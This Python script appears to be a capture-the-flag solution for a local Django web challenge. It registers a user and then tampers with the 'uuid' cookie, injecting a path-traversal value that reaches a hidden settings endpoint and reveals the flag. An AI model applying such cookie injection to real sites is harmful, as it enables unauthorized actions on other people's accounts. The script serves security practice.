import re
import random

import requests

REGEX_CSRF = '<input type="hidden" name="csrfmiddlewaretoken" value="(.*)">'
REGEX_FLAG = "lh2024\{(.*)\}"
URL_DOMAIN = "http://localhost:8000"
USERNAME = "test" + str(random.randint(0, 999999))
PASSWORD = "Password123@"


def get_CSRF(session):
    r = session.get(f"{URL_DOMAIN}/accounts/sign-up/")
    if r.ok:
        m = re.search(REGEX_CSRF, r.text)
        return m.group(1)


def signup(session):
    csrf = get_CSRF(session)
    if csrf:
        r = session.post(
            f"{URL_DOMAIN}/accounts/sign-up/",
            data={
                "csrfmiddlewaretoken": csrf,
                "username": USERNAME,
                "password1": PASSWORD,
                "password2": PASSWORD,
            },
            allow_redirects=True,
        )
        if r.ok:
            return session


def get_flag(session):
    r = session.get(f"{URL_DOMAIN}/me/")
    if r.ok:
        m = re.search(REGEX_FLAG, r.text)
        return m.group(0)


def exploit(session):
    uuid = session.cookies.pop("uuid")
    session.cookies.update({"uuid": f"../set/{uuid}?retirement=60&choice=0"})
    return get_flag(session)


session = requests.Session()
session = signup(session)
if session:
    print(exploit(session))
